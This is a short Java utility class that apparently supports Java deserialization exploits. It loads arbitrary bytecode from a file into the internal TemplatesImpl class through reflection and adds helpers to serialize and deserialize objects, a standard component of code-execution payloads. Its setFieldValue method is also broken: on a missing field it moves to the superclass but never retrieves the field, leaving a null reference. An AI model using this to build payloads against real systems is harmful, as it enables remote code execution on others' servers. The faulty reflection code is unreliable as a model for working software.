package tools;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class TemplatesGen {
    public static Templates getTemplates(String bytePath) throws IOException, IllegalAccessException {
        byte[] bytes = Files.readAllBytes(Paths.get(bytePath));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "1diot9");
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});

        return templates;
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws IllegalAccessException {
        Class<?> aClass = obj.getClass();
        Field field = null;
        try {
            field = aClass.getDeclaredField(fieldName);
        } catch (NoSuchFieldException e) {
            aClass = aClass.getSuperclass();
        }
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] ser2bytes(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void ser2file(Object obj, String fileName) throws IOException {
        FileOutputStream fos = new FileOutputStream(fileName);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deser(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }
}
